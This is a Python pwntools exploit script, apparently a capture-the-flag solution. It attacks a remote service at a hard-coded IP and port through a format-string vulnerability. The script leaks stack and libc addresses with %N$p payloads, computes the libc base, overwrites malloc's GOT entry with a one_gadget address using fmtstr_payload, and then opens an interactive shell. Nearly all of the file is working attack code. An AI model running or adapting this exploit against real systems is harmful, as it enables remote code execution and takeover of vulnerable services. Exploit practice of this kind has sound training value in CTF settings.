from pwn import *
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
# binary = "/bin/bash"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b main
'''
def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    pp = remote("5.161.93.250", 42069)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def leakaddr(offset):
    pp.recvuntil(b">\n")
    pp.sendline(f"%{offset}$p p".encode())
    leak = pp.recvuntil(b" p\n").replace(b" p\n", b"")
    return (int(leak, 16))


def leak():
    for i in range(133):
        pp.recvuntil(b">\n")
        pp.sendline(f"%{i}$p p".encode())
        leak = pp.recvuntil(b" p\n").replace(b" p\n", b"")
        log.info(f"{leak}\t\t\t{i}")
        if (b"7f" in leak and len(leak) == 14 and leak.count(b'0') < 6):
            pp.recvuntil(b">\n")
            pp.sendline(f"%{i}$sxpf".encode())
            strleak = pp.recvuntil(b"xpf\n").replace(b"xpf\n", b"")
            log.info(f"--->\t\t{strleak}")

## offsets 
lib_ret = 43

def exploit():
    log.warn("server connected")
    pp.sendline(b"%43$p")
    pp.recvline()
    libc_leak = int(pp.recvlineS(), 16)
    libc_base = libc_leak - 0x29d90
    strlen_got = libc_base + 0x21a098
    og = 0xebc85
    print(hex(libc_base))
    print(hex(strlen_got))
    print(hex(og + libc_base))


    libc_base = leakaddr(43) - 0x29d90
    one_gadget = 0xebc85 + libc_base
    strlen_got = libc_base + 0x21a098
    log.info(f"libc base {hex(libc_base)} -- pie {hex(strlen_got)} {hex(one_gadget)}")
    pprint(libc.got)

    pay = fmtstr_payload(8, {libc.got.malloc:  0xebc85 + libc_base})
    pp.recvuntil(b">\n")
    pp.sendline(pay)

    pp.interactive()

if (args.REMOTE):
    libc = ELF("./libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
# elf = context.binary = ELF(binary)
context.arch = "amd64"
pp = init()
# leak()
exploit()
